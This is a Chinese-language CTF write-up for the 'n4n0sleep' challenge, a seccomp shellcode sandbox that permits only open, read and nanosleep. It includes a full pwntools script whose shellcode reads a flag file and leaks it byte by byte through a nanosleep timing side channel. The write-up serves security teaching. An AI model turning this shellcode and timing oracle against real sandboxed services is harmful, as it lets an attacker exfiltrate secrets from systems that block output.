# n4n0sleep

## 题目简述

程序先读取恰好 `0x100` 字节 shellcode，把映射权限从 RW 改成 RX，再 fork 子进程执行。子进程设置 1 秒 alarm、禁止使用 TSC 计时、关闭所有文件描述符，最后安装 seccomp。过滤器在 x86-64 下只允许三个 syscall：`read`、旧式 `open` 和 `nanosleep`；父进程等待子进程结束后向客户端输出一个点号 `.`。

目标为 amd64 PIE ELF，保护为 Full RELRO、栈 canary、NX 和 PIE 全开。不过程序主动提供 RX shellcode 执行入口，传统控制流保护并非主要障碍；真正的问题是在没有 `write`、且标准文件描述符已关闭的条件下把 flag 内容传出。

## 解题过程

### 建立外部时间 oracle

关闭 0、1、2 后，第一次成功 `open("flag", 0)` 会取得最小可用文件描述符，通常就是 0。shellcode 随后可用 `read(0, buf, n)` 读入 flag。由于 `write` 被 seccomp 禁止，只能逐字节比较，并把比较结果编码为子进程运行时间：

```text
猜测正确  → nanosleep(0.2 秒) → 子进程结束 → 父进程输出 "."
猜测错误  → 立即触发被禁 syscall → 子进程被杀 → 父进程立即输出 "."
```

客户端从发送 shellcode到收到 `.` 的墙钟时间即可区分两种分支。`prctl(PR_SET_TSC, PR_TSC_SIGSEGV)` 只阻止 shellcode内部使用 `rdtsc`，不影响客户端测量网络往返时间。

每次请求都应重新连接，生成包含“位置”和“候选字节”的独立 shellcode。1 秒 alarm 限制了单次延迟上限，因此选择约 0.2 秒能留下较明显信号，又不至于触发 alarm。远程抖动较大时，对同一候选重复测量并取中位数。

### 可复用求解脚本

下面脚本把正确分支设为休眠，逐位置选择耗时最大的字符。`HOST`、`PORT` 和已知 flag 前缀需要按比赛环境填写；若前缀未知，将 `known` 设为空字节串即可。

```python
#!/usr/bin/env python3
import statistics
import string
import time

from pwn import *

context.arch = "amd64"
HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 9999)
REPEATS = int(args.REPEATS or 1)

alphabet = (string.ascii_letters + string.digits + "{}_-").encode()
known = bytearray(b"miniL{")


def make_probe(pos: int, guess: int) -> bytes:
    sc = asm(f"""
        mov ebx, 0x67616c66
        push rbx
        mov rdi, rsp
        xor esi, esi
        mov eax, 2
        syscall

        mov edi, eax
        sub rsp, 0x100
        mov rsi, rsp
        mov edx, 0x80
        xor eax, eax
        syscall

        cmp byte ptr [rsp + {pos}], {guess}
        jne fast_exit

        sub rsp, 0x10
        mov qword ptr [rsp], 0
        mov qword ptr [rsp + 8], 200000000
        mov rdi, rsp
        xor esi, esi
        mov eax, 35
        syscall

    fast_exit:
        mov eax, 60
        syscall
    """)
    assert len(sc) <= 0x100
    return sc.ljust(0x100, b"\x90")


def sample(pos: int, guess: int) -> float:
    costs = []
    for _ in range(REPEATS):
        io = remote(HOST, PORT, level="error")
        payload = make_probe(pos, guess)
        start = time.perf_counter()
        io.send(payload)
        io.recvuntil(b".", timeout=1.5)
        costs.append(time.perf_counter() - start)
        io.close()
    return statistics.median(costs)


while not known.endswith(b"}"):
    pos = len(known)
    timings = [(sample(pos, c), c) for c in alphabet]
    delay, winner = max(timings)
    known.append(winner)
    log.success(f"{bytes(known)!r}  delay={delay:.3f}s")
```

脚本中的 `mov eax,60; syscall` 故意使用不在白名单中的 `exit`。seccomp 会立即终止错误分支；正确分支先完成 `nanosleep`，再以同样方式结束。这样无需依赖一个额外获准的正常退出 syscall。

原资料没有保存实际 flag 或远程测量记录，仓库中的 `build/flag` 也是空占位文件，因此无法离线复现最终字符串；源码、BPF 规则和时序分支本身足以验证该 oracle 的成立条件。

## 方法总结

- 核心技巧：在仅允许 `open/read/nanosleep` 且无输出 fd 的 shellcode 沙箱中，用子进程结束前的可控休眠建立逐字节时间侧信道。
- 识别信号：父进程 `waitpid` 后才输出固定响应，子进程又能读取秘密并调用延时 syscall，这是天然的远程时间 oracle。
- 复用要点：先确认关闭 fd 后 `open` 的返回值；为网络抖动预留足够延迟并用中位数去噪；shellcode 必须补齐到服务要求的完整 `0x100` 字节，否则加载循环会继续等待。
